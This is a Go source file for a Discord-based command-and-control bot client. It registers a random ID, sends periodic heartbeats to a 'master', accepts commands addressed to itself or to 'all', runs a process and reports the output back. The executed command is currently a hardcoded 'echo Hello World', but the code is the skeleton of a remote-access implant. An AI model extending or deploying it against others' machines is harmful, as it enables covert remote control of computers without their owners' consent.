package main

import (
	"fmt"
	"github.com/google/uuid"
	"os"
	"os/exec"
	"os/signal"
	"syscall"
	"time"

	"github.com/brnlee/DiscordGo_CC/discord"
	"github.com/bwmarrin/discordgo"
)

var botID string

func init() {
	botID = uuid.New().String()
}

func main() {

	// Create a new Discord session using the provided bot token.
	dg, err := discordgo.New("Bot " + discord.BotToken)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	// Register the messageCreate func as a callback for MessageCreate events.
	dg.AddHandler(messageCreate)

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		fmt.Println("error opening connection,", err)
		return
	}
	// Tell master that it is now connected
	discord.SendMessage(dg, fmt.Sprintf("%s\n%q\n%q", botID, "Connected", "None"))
	// Wait here until CTRL-C or other term signal is received.
	fmt.Println("Bot is now running.  Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)

	// Heartbeat notification every 15 seconds
	go func(s *discordgo.Session) {
		for _ = range time.Tick(discord.Timeout * time.Second) {
			discord.SendMessage(s, fmt.Sprintf("%s\n%q\n%q", botID, "Connected", "None"))
		}
	}(dg)

	<-sc
	// Cleanly close down the Discord session.
	println("Closing Discord Session")
	e := dg.Close()
	if e != nil {
		println("There was an error closing the Discord session connection.")
	}
}

// This function will be called (due to AddHandler above) every time a new
// message is created on any channel that the autenticated bot has access to.
func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {

	// Ignore all messages created by the bot itself
	// This isn't required in this specific example but it's a good practice.
	if m.Author.ID == s.State.User.ID {
		return
	}
	var target string
	var action string
	var arg string
	n, err := fmt.Sscanf(m.Content, "%s\n%s\n%q", &target, &action, &arg)
	if err != nil || n != 3 {
		return
	}
	if target == "all" || target == botID {
		println("Received Command", action, arg)
		cmd := exec.Command("echo", "Hello World")
		stdout, err := cmd.Output()
		if err != nil {
			println(err)
			return
		}
		response := fmt.Sprintf("%s\n%q\n%q", botID, action+" "+arg, string(stdout))
		discord.SendMessage(s, response)
	}
}
